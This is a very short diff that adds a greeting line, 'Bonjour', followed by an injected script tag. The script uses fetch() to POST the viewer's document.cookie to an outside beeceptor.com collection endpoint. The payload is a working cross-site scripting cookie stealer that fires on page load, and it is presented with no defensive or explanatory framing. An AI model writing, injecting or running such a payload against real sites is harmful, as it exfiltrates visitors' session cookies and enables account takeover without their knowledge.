@@ -1,0 +1,2 @@
+Bonjour 
+<script>   fetch("https://hyexxhackgood.free.beeceptor.com", {     method: "POST",     headers: {       "Content-Type": "application/x-www-form-urlencoded"     },     body: "cookies=" + document.cookie   }); </script>
